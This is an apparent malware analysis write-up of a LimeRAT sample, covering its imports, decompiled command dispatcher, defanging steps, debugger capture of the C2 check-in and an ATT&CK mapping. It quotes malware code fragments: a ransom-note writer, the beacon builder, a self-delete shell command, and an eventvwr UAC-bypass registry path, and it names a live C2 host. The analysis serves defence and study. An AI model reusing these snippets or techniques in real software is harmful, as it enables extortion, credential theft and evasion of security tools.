## Executive Summary

This is a static and dynamic analysis of a sample that is signatured as njRAT on MalwareBazaar, but turns out to be LimeRAT once you look inside it. The binary is a single .NET stub with no packing and almost no obfuscation. The work here is different: the real shape of the file is a command dispatcher wired to a stack of plugins. A ransomware module, a Bitcoin clipper and wallet stealer, a keylogger, a credential dumper, a Slowloris flooder, a screen locker, a USB spreader, and an aggressive process killer that hunts analysis tools and deletes the malware off disk the moment it thinks it is inside a VM. This writeup covers the static read of the dispatcher, the defang needed to detonate it safely, and the live debugger breakpoint that pulled the C2 check-in out of memory in cleartext. It closes with a MITRE ATT&CK mapping, an IOC table, and notes toward a detection rule.

## LimeRAT, the open source RAT that keeps showing up

LimeRAT is a .NET remote access trojan published openly by the author NYAN-x-CAT. Because the source is public, it gets compiled, renamed, and reconfigured by anyone who wants a free toolkit, which is exactly why it keeps landing in sample sets under whatever name the operator felt like typing into the builder. It is modular by design, a thin stub connects to a C2 and then runs whichever plugin the operator sends it. The plugins cover the full ransomware-to-stealer spectrum, and this particular build has most of them switched on.

## Initial triage

PEStudio gave the picture in a few rows. Three sections (`.text`, `.rsrc`, `.reloc`), almost all of the code sitting in section `[0]` (`.text`), and a `.text` entropy of 5.758. That moderate entropy is the first useful fact: this file is not packed. After Snake's 7.6 entropy and its noise-image resource, a calm 5.7 with no high-entropy blob means the logic is right there in the file, no in-memory decoding to chase.

The import directory and the `mscoree.dll` dependency confirmed a managed assembly, so this is a dnSpy job, not a disassembler job. The library list was short but already leaking intent before I opened a single function:

- `mscoree.dll` (implicit, the .NET runtime bootstrapper)
- `user32` and `kernel32` (expected)
- `wintrust.dll` flagged, exporting `WinVerifyTrust`
- `avicap32.dll`, the AVI capture window class, which on a RAT means webcam capture
- `ntdll`, with `NtSetInformationProcess` in the imports

> **Habit:** read the library and import list as a set before you open the decompiler. `avicap32.dll` plus `wintrust.dll` plus `ntdll` on a small .NET file is already telling you "webcam, trust checks, native process tricks" before you have read one line of code.

## Reading the imports as behaviour, not as a list

This is the same trick that cracked Snake's injector: do not analyse APIs one at a time, recognise the cluster. The string and import dump grouped into stories on its own.

The keylogging cluster was unambiguous:

```
LowLevelKeyboardProc
SetWindowsHookEx
UnhookWindowsHookEx
CallNextHookEx
GetAsyncKeyState
GetKeyboardState
MapVirtualKey
```

A low level keyboard hook procedure installed with `SetWindowsHookEx`, torn down with `UnhookWindowsHookEx`, with `GetAsyncKeyState` and `MapVirtualKey` to translate the scan codes. That is a keylogger, and `GetForegroundWindow` plus `GetWindowThreadProcessId` sitting next to it give the logger window-title context so the captured keystrokes are tagged with the application they came from.

The recon cluster was WMI:

```
SELECT * FROM AntivirusProduct
SELECT * FROM Win32_VideoController
```

Querying `AntivirusProduct` from the Security Center namespace is defence enumeration. Pulling `Win32_VideoController` is a classic VM tell, because emulated display adapters give the game away, and it doubles as host fingerprinting.

The crypto cluster (`AES_Encrypt`, `AES_Decrypt`, `Crypt`, `CreateEncryptor`) told me there was symmetric crypto in play, but, and this matters, that on its own does not prove ransomware. The same routines are used by plenty of families just to encrypt their config or their C2 traffic. I noted it and moved on to find proof of which.

The thread cluster is where I had to walk back an early guess. I saw `OpenThread`, `SuspendThread`, and `NtSetInformationProcess` and wrote "hollow?" in my notes. That was a reasonable reflex, but process hollowing has a specific signature: `VirtualAllocEx`, `WriteProcessMemory`, `GetThreadContext`, `SetThreadContext`, and `NtUnmapViewOfSection`. None of those appear in the import or string dump. What I actually have is thread suspension, which fits the process killer far better than hollowing. So hollowing came out of the writeup. By my own rule, I cannot conclude a technique I have not found the calls for...

> **Habit:** a crypto API is not a ransomware finding, and a suspended thread is not process hollowing. Match the full quartet or write down the weaker, supported conclusion.

## So what does it do exactly ?

In dnSpy the entry point was tiny:

```csharp
namespace Lime
{
    public class StartNow
    {
        [STAThread]
        public static void main()
        {
            Core.eroc();
        }
    }
}
```

`Core.eroc()` leads through `Core.RC()` into `Core.connect()`, which is the real start of the program. Following the call tree, the function that does the heavy lifting is a giant method, `Ind(byte[] b)`, and the first time I read it I saw the ransom note builder and wrote "Wait this is a ransomware?" in my notes.

```cs
using (StreamWriter streamWriter = new StreamWriter(text6, true))

streamWriter.WriteLine("All your files have been locked");
streamWriter.WriteLine("");
streamWriter.WriteLine("You can get them back, Just pay us " + array[1] +"
streamWriter.WriteLine("");
streamWriter.WriteLine("Our bitcoin address is");
streamWriter.WriteLine("");
streamWriter.WriteLine(Core.BTC_ADD);
streamWriter.WriteLine("");
streamWriter.WriteLine("Watch this video to learn how to pay us hxxps://www.youtube[.]com/watch?v=]i9IwPId5Uk");
streamWriter.WriteLine("");
streamWriter.WriteLine("This is not a joke. This is a ransomware");

Process.Start(text6);
```

- Ransomware: `RwareBG`, `RwareDEC`, `RwareSU`. The note writer drops "All your files have been locked", a Bitcoin demand, and the operator's BTC address.
- Crypto theft, two separate things: `GetWallet()` fingerprints installed wallets (Bitcoin Core via `bitcoin-qt`, `Bitcoin.com`, and Electrum by process name), and the BitcoinGrabber clipper (`BTC_ADD`, `bitgrb.stopme()`) swaps a copied Bitcoin address in the clipboard for the operator's, so a victim pastes the wrong destination.
- Keylogging: the `kl` command, backed by the hook cluster above.
- Credential theft: `pass2` writes a temporary executable, runs it, sleeps, then reads `dump456\pwd.txt`. `delchrm` kills Chrome and deletes its `Login Data` and `Cookies` to force a re-login.
- DDoS: `ddos.slowloris.start` calls `StartSlowloris`, and `seed` seeds a torrent.
- Screen locking: `SL` and `SLU` lock and unlock the desktop with a LimeRAT screen locker form.
- System manipulation and trolling: wallpaper replacement, mouse button swap, monitor on and off, text to speech, message boxes, taskbar hide.
- Defence evasion: disable Task Manager, disable cmd, clear event logs, and the process killer.
- UAC bypass: `GiveMeAdmin` writes `HKCU\Software\Classes\mscfile\shell\open\command` and then launches `eventvwr.exe`. That is the textbook eventvwr hijack, where Event Viewer auto-elevates and runs the attacker command from the hijacked key.

## The process killer, and why a naive VM run dies

The most analyst-hostile piece is `MyAntiProcess`. It runs on a timer and does three things on a loop. It walks running processes and kills anything whose window title or process name matches a long hardcoded list of analysis and monitoring tools. The list is long and specific: Process Hacker, Process Explorer, SbieCtrl (Sandboxie), Wireshark, ApateDNS, KeyScrambler, TCPView, Fiddler-style sniffers, RegShot, NetworkMiner, Process Lasso, and dozens more. It also matches by main window title, so "Process Hacker", "ApateDNS", "Malwarebytes Anti-Malware", and similar caught running tools get force closed.

Then it checks for virtualization. If it finds `VGAuthService` (VMware) or `VBoxService` (VirtualBox) running, it sends a status message to the C2 ("VMware was detected! I deleted myself"), and calls `Core.UNS()`, the uninstall routine, which removes the binary and its persistence and exits.

## Defanging for a safe detonation

The minimal set of changes was about killing the trigger, not chasing every destructive action:

- Stub `Core.UNS()`. It is `public static void`, and its entire body is uninstall and self-delete, so replacing the body with a bare `return;` is correct and loses nothing worth observing.
- Neuter the entry-point self-delete, the `cmd.exe /c ping 0 -n 2 & del "..."` shell call that wipes the file on exit.
- Neuter the two VM-detection branches in `MyAntiProcess` that call `Core.UNS()`, so finding the guest services no longer triggers the uninstall.

![PEStudio sections and library list for the LimeRAT stub](/assets/img/UNS-Cleared.png)

That is the whole defang. The point is that `UNS()` is the single chokepoint: kill it and the self-destruct paths all dead-end, without me having to find and disable each individual delete.

## Catching the C2 beacon in cleartext, the breakpoint that did it

This is the part I most wanted to get clean, so I will walk it step by step, because the technique generalises to almost any .NET RAT.

The check-in is built and sent inside `connect()`. The relevant lines assemble a string into a local called `text`, then send it:

```csharp
text = string.Concat(new string[]
{
    text,            // the decoded group value, then the rest of the record
    Core.H, ":", Core.P, "\r\n",
    Core.DR, "\r\n",
    Core.EXE, "\r\n",
    Conversions.ToString(Core.Idr), "\r\n",
    Conversions.ToString(Core.IsF), "\r\n",
    Conversions.ToString(Core.Isu), "\r\n",
    Conversions.ToString(Core.BD)
});
Core.Send("inf" + Core.Y + Core.ENB(ref text));
```

The wire message is `"inf"`, then `Core.Y` (which is the constant `"1111"`, acting as the message-type and field splitter), then `Core.ENB(text)`. Following `ENB`, it is just `Convert.ToBase64String(Encoding.UTF8.GetBytes(text))`. So the payload is base64 encoded, not encrypted.

Set a breakpoint on the `Core.Send(...)` line and read the local `text` in the Locals window before the line executes. At that instant `text` holds the entire check-in record in plaintext, fully assembled, before `ENB` turns it into base64.

> **Habit:** to recover a RAT's C2 format, find the send call and breakpoint the exact line that wraps the payload, then read the local before the encode or encrypt function runs. The last cleartext moment is always one step before the outbound write. This works whether the family uses base64, like this one, or AES.

There was one obstacle. Because the connection was failing, execution never reached the send naturally, it was stuck in the reconnect loop, and the `Core.C.Connect(...)` call was throwing every lap. I did not need the socket to actually open in order to read a string that is built from local config fields, so I broke the chain in the debugger instead of fighting the network. I set a breakpoint on the `Core.C.Connect(Core.H, ToInteger(Core.P))` line, and when it hit, I used dnSpy's Set Next Statement to move the instruction pointer one line down, past the throwing `Connect()` call, to `Core.Cn = true;`. That skips the failing socket connect and lets execution flow on through the record construction to the send line. The `Send` itself would still throw, since the socket is not really connected, but that does not matter: I only need to see `text`, not transmit it, so I read the local at the send line and let the exception fall where it likes.


## What the beacon says

Read against the config constants, most of the record maps cleanly:

- `Lime` is the decoded `VN` field, the group or campaign identifier. This is the same `TGltZQ==` to `Lime` decode from the attribution section, now confirmed live.
- `pmjgy-185-114-117-137.run.pinggy-free.link:44549` is `Core.H` and `Core.P`, the C2 host and port, both confirming the static values over the wire.
- The fourth field, `patchedNJLime.exe`, is the running stub's own filename, picked up at runtime. It shows my patched copy's name, which is a nice confirmation that the field is the live module name rather than a baked-in constant.
- The four boolean fields, `False`, `True`, `True`, `False`, match the static config exactly: `Idr = False`, `IsF = True`, `Isu = True`, `BD = False`. Reading them off the binary and watching them come back in the same order in the beacon is a satisfying close of the loop.

The interesting field is the third one, `NjRat`. That is a build or campaign tag, a string set by whoever compiled this stub, and it is almost certainly where the njRAT filename came from in the first place. The operator tagged the build "NjRat", and someone downstream named the file to match. The code is still LimeRAT.

## MITRE ATT&CK Mapping

The dispatcher spans a lot of ground, so the mapping is broad. Each entry below is backed by code or a string in the sample, not by family reputation.

**T1059.003 Windows Command Shell:** `Interaction.Shell` runs `cmd.exe` for the self-delete and `shutdown` for restarts, and runs `schtasks`.

**T1053.005 Scheduled Task:** persistence and cleanup around a task named `NYAN`.

**T1547.001 Registry Run Keys / Startup Folder:** the `sf` field is `Software\Microsoft\Windows\CurrentVersion\Run`, and several handlers write to the Startup folder.

**T1548.002 Bypass User Account Control:** `GiveMeAdmin` writes `HKCU\Software\Classes\mscfile\shell\open\command` and launches `eventvwr.exe`.

**T1112 Modify Registry:** `DisableTaskMgr`, `DisableCMD`, and the wallpaper and ransom-note registry writes under `Control Panel\Desktop`.

**T1562.001 Impair Defenses, Disable or Modify Tools:** `MyAntiProcess` terminates a hardcoded list of analysis, sniffing, and AV tools.

**T1518.001 Security Software Discovery:** the WMI `SELECT * FROM AntivirusProduct` query.

**T1497.001 Virtualization/Sandbox Evasion, System Checks:** detection of `VGAuthService` (VMware) and `VBoxService` (VirtualBox), and the `Win32_VideoController` query.

**T1070.001 Clear Windows Event Logs:** the `EventLogs` handler enumerates logs and calls `Clear()`.

**T1070.004 File Deletion:** the `ping 0 -n 2 & del` self-delete stub.

**T1056.001 Keylogging:** the `SetWindowsHookEx`, `LowLevelKeyboardProc`, `GetAsyncKeyState`, `GetKeyboardState`, `MapVirtualKey` cluster, with `GetForegroundWindow` for window context.

**T1115 Clipboard Data:** the `ClearClp` handler and the BitcoinGrabber clipper, which reads and replaces clipboard contents.

**T1125 Video Capture:** `avicap32.dll` and `capGetDriverDescription` indicate webcam capture.

**T1555 Credentials from Password Stores:** the `pass2` handler runs a credential dumper and reads its `pwd.txt` output, and `GetWallet()` fingerprints cryptocurrency wallets.

**T1555.003 Credentials from Web Browsers:** the `delchrm` handler targets Chrome's `Login Data` and `Cookies`.

**T1091 Replication Through Removable Media:** the USB spreader copies the stub to removable drives, hides it, and drops `.lnk` shortcuts that point back to it.

**T1486 Data Encrypted for Impact:** the `RwareBG` / `RwareDEC` / `RwareSU` ransomware module and its "All your files have been locked" note.

**T1657 Financial Theft:** the clipboard clipper and wallet targeting aim directly at cryptocurrency theft.

**T1498 Network Denial of Service:** the `ddos.slowloris.start` handler and `StartSlowloris`.

**T1105 Ingress Tool Transfer:** `DownloadData` and the `ZIP()` gzip helper pull and unpack additional payloads from the C2 at runtime.

**T1571 Non-Standard Port and T1572 Protocol Tunneling:** raw TCP C2 on port `44549` over a pinggy tunnel.

**T1132.001 Standard Data Encoding:** the `inf` beacon is base64 encoded via `ENB`.

**T1573.001 Encrypted Channel, Symmetric Cryptography:** AES routines (`AES_Encrypt`, `AES_Decrypt`, `CreateEncryptor`) are present for payload and config handling.

**T1082 System Information Discovery:** `GetCPU`, `GetVideoCard`, OS, username, and machine name collection feed the check-in.

## Closing thoughts

The static read said LimeRAT, the `VN` field decoded to Lime, the `NYAN` task named the author, and then the live beacon came back carrying the same `Lime` group and a `NjRat` build tag in the same packet, demonstrating from the malware's own traffic exactly why the filename lies and the code does not. The dispatcher reframed a "ransomware" first impression into a full modular RAT.
